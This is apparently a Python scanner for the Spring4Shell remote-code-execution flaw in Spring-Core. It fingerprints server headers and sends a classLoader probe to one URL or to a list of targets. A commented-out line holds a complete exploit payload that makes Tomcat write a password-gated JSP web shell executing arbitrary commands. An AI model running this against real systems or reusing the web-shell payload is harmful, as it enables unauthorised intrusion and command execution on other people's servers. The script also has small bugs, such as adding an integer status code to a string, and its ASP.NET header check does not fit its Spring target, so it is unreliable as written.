

import requests
import argparse
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

def VersionCheck(url):
    print(url + ':')
    try:
        check = requests.head(url,timeout=15,allow_redirects=False, verify=False)
        if check.status_code == 200:
            if "X-Powered-By" in check.headers:
                if check.headers['X-Powered-By'] == 'ASP.NET':
                    print("Runs on ASP.NET")
                if 'X-AspNet-Version' in check.headers:
                    print('Version: ' + check.headers['X-AspNet-Version'])
            else:
                print('Banner Grabbing did not work')
        else:
            print('Status code: ' + check.status_code)
    except:
        print('Exception')

def Detect(url):
    headers = {
    "Content-Type": "application/x-www-form-urlencoded"
    }
    # data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7D%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7D.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7D&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    data = "class.module.classLoader.URLs[0]=0"
    try:
        go = requests.post(url,data=data,timeout=15,allow_redirects=False, verify=False, headers=headers)
        if go.status_code == 400:
            print("Vulnerable!")
        else:
            print(url + ' : ')
            print(go.status_code)
    
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
    parser.add_argument('--file',help='File containing Form Endpoints',required=False)
    parser.add_argument('--url',help='target Form Endpoints',required=False)
    args = parser.parse_args()
    if args.url:
        VersionCheck(args.url)
        Detect(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Detect(i)
                VersionCheck(i)

if __name__ == '__main__':
    main()